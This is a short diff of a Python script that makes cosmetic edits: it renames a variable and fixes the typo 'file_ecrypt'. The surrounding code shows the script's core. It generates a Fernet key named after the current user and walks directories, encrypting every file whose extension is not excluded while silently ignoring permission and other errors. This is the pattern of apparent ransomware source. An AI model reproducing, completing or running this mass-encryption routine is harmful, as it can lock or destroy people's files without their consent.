@@ -3,9 +3,9 @@
 from cryptography.fernet import Fernet
 import os
 
-# ENVIRONMENT VARIABLE
-usr = os.environ["USERNAME"]
-usrkey = "{}.key".format(usr)
+# GET THE ENVIRONMENT VARIABLE
+current_user = os.environ["USERNAME"]
+usrkey = "{}.key".format(current_user)
 
 # GENERATE KEY FUNCTION
 def genkey(name):
@@ -15,7 +15,7 @@ def genkey(name):
         file.write(key)
         
 # FILE ENCYPTING FUNCTION
-def file_ecrypt(key, name):
+def file_encrypt(key, name):
     with open(name,'rb') as files:
         data = files.read()
 
@@ -46,7 +46,7 @@ def filelist():
                             if not(ext in my_ext):
                                 try:
                                     ally = os.path.join(root, file)
-                                    file_ecrypt(key, ally)
+                                    file_encrypt(key, ally)
                                 except PermissionError:
                                     pass
                                 except:
